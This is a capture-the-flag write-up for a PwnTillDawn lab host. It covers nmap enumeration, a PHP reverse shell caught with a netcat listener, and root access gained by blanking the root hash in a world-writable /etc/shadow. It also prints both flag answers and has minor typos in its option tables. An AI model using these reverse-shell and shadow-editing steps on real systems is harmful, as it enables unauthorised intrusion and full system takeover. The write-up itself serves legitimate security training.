# 1. VPN Setup

Before interacting with the lab environment, download the .ovpn file from the PwnTillDawn portal and connect via OpenVPN. [page:1]

        sudo openvpn PwnTillDawn.ovpn

Once you see Initialization Sequence Completed, the tunnel is up and you are inside the 10.150.150.0/24 network. [page:1]

<img width="847" height="815" alt="image" src="https://github.com/user-attachments/assets/ffbc71f0-94c4-48a2-99c2-3c6deeb1c52f" />

# 2. Host Discovery — Network Scan

With the VPN established, perform a ping sweep to discover live hosts in the range. [page:1]

        nmap -sn 10.150.150.10-254

| option | Description                                        |
|--------|----------------------------------------------------|
| `-sn`  | Ping scan only — no port scan, just host discovery |

Result: 47 live hosts are detected, including the target 10.150.150.18. [page:1]

<img width="618" height="843" alt="image" src="https://github.com/user-attachments/assets/98d21fa9-4dcd-4f88-89bc-efb8a08987eb" />

# 3. Target Enumeration — Port Scan

Run a service and version scan against the target to identify open ports and running services. [page:1]

        nmap -sC -sV -v 10.150.150.18 -oN nmap

| option     | Description               |
|--------    |---------------------------|
| `-sC`      | Run default NSE scripts   |
| `-sV`      | Detect service versions   |
| `-V`       | Verbose output            |
| `-oN nmap` | Save output to file `nmap`|


Open the target in a browser: [page:1]

Results:

| port | State | Service           |
|------|-------|-------------------|
| 80   | open  | HTTP (web server) |

Only port 80 (HTTP) is open on this host. [page:1]

<img width="564" height="374" alt="image" src="https://github.com/user-attachments/assets/c775fcb9-f019-4d1b-8fa0-52196fa037a9" />

# 4. Web Application Reconnaissance

Open the target in a browser: [page:1]

        http://10.150.150.18

<img width="943" height="773" alt="image" src="https://github.com/user-attachments/assets/a29050ff-acd5-4e04-9db4-f803aea7abb2" />

Enumerate the application: look for upload forms, parameters, file inclusion points, and anything that might lead to arbitrary file upload or code execution. [page:1]

# 5. Exploitation — Web Reverse Shell

## 5.1 Prepare the Reverse Shell

The web application exposes a vulnerability that allows us to upload or inject a PHP reverse shell. [page:1]

On Kali, use the Pentestmonkey PHP reverse shell located at: [page:1]


        /usr/share![Uploading Screenshot 2026-04-04 234239.png…]()
        /webshells/php/php-reverse-shell.php

<img width="634" height="279" alt="image" src="https://github.com/user-attachments/assets/fa64213b-6e19-44cb-8558-94455271050b" />

Edit it to set your VPN IP and listening port:

$ip   = '10.150.150.XXX'; // Your VPN IP
$port = 1234;             // Your listening port [page:1]

## 5.2 Set Up a Netcat Listener

On your attacking machine, start a Netcat listener **before** triggering the shell: [page:1]

        nc -lvnp 1234

<img width="415" height="69" alt="image" src="https://github.com/user-attachments/assets/1c753433-f766-4686-aadf-f5e3f041536d" />

| Option | Description       |
|--------|-------------------|
| `-1`   | Listen mode       |
| `-v`   | Verbose           |
| `-n`   | No DNS resolution |
| `-p`   | Port number       |


## 5.3 Upload and Trigger the Shell

Upload the PHP reverse shell through the vulnerable upload or inclusion mechanism, then browse to the uploaded file to execute it. [page:1]

## 5.4 Shell Received
        
        listening on [any] 1234 ...
        connect to [10.150.150.XXX] from (UNKNOWN) [10.150.150.18] XXXXX
        Linux snare 4.19.0-16-amd64 ...
        $ id
        uid=33(www-data) gid=33(www-data) groups=33(www-data)

<img width="834" height="198" alt="image" src="https://github.com/user-attachments/assets/478dd807-3850-42a7-ab0a-5e5b99cd14ca" />

You now hold a shell as `www-data`. [page:1]

# 6. Flag 1 — Initial Foothold

With the web shell running, search the filesystem for the first flag. [page:1]

        cat /path/to/flag1

Flag 1: e335462da856f39997bffdc04b8d89ce1104fcc5 [page:1]

# 7. Privilege Escalation — /etc/shadow

## 7.1 Check for Write Access

Enumerate writable files and potential privilege escalation vectors from `www-data`. [page:1]

        find / -writable -type f 2>/dev/null | grep -v proc

The file /etc/shadow is shown as world-writable, which is a critical misconfiguration. [page:1]

<img width="809" height="562" alt="image" src="https://github.com/user-attachments/assets/54d42cd8-233f-4c79-add8-754be6b477df" />

## 7.2 Read the Shadow File

Open the shadow file with `vim`: [page:1]

        vim /etc/shadow

Copy the first two lines (root and the next user) for reference. [page:1]

A root entry looks like:

        root:$6$<hash>:18586:0:99999:7:::
        [page:1]

## 7.3 Remove the Root Password Hash

In `vim`, navigate to the `root` line and remove the password hash, leaving the field empty; this sets root’s password to blank. [page:1]

The modified line should be:

        text
        root::18586:0:99999:7:::
        [page:1]
        
Save and quit:

        vim:wq!

<img width="655" height="398" alt="image" src="https://github.com/user-attachments/assets/4ee2497a-a3bd-4f4c-bdfc-7250103f47e5" />

## 7.4 Switch to Root

Now switch to root using the empty password: [page:1]

        su root

Press Enter when prompted for password

Verify root access:

id

        # uid=0(root) gid=0(root) groups=0(root)

whoami

        # root

# 8. Flag 2 — Root Access

As root, move to the root home directory and read the second flag. [page:1]

        cat /root/flag.txt

If needed, search common locations:

        find / -name "flag*" 2>/dev/null

**Flag 2:** `2b0286a69b276189afe50517304963e5fa5982d9` [page:1]







